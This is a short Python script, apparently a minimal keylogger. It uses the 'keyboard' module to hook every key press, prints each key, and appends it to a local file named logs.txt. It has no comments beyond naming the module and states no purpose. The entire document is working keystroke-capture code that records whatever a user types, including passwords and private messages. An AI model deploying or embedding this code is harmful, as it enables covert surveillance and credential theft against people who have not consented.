import keyboard #The keyboard module

def filter(char):
    if char == "space":
        return " "
    elif len(char) > 1:
        return "[%s]" % char
    else:
        return char

def logger(event):
    print(filter(event.name))
    writer(filter(event.name))

def writer(data):
    with open("logs.txt","a") as file:
        file.write(data)
        
keyboard.on_press(logger)
keyboard.wait()